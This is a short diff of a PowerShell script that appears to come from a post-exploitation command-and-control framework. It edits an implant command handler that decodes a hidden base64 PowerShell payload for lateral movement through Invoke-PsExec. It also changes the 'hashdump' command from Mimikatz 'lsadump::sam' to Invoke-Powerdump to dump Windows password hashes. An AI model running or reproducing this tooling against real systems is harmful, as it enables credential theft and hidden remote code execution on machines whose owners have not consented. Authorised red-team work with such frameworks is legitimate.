@@ -792,7 +792,7 @@ param
                 if (Test-Path "$FolderPath\payloads\payload.bat"){ 
                     CheckModuleLoaded "Invoke-PsExec.ps1" $psrandomuri
                     $proxypayload = Get-Content -Path "$FolderPath\payloads\payload.bat"
-                    $pscommand = $pscommand -replace 'Invoke-PsExecProxyPayload', 'Invoke-PsExec'
+                    $pscommand = $pscommand -replace 'Invoke-PsExecPayload', 'Invoke-PsExec'
                     $proxypayload = $proxypayload -replace "powershell -exec bypass -Noninteractive -windowstyle hidden -e ", ""
                     $rawpayload = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($proxypayload))
                     $ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($rawpayload)
@@ -812,8 +812,8 @@ param
             }
             if ($pscommand.ToLower().StartsWith('hashdump'))
             { 
-                CheckModuleLoaded "Invoke-Mimikatz.ps1" $psrandomuri
-                $pscommand = "Invoke-Mimikatz -Command $($tick)$($speechmarks)lsadump::sam$($speechmarks)$($tick)"
+                CheckModuleLoaded "Invoke-Powerdump.ps1" $psrandomuri
+                $pscommand = "Invoke-Powerdump"
             }
             if ($pscommand.ToLower().StartsWith('invoke-sqlquery'))
             { 
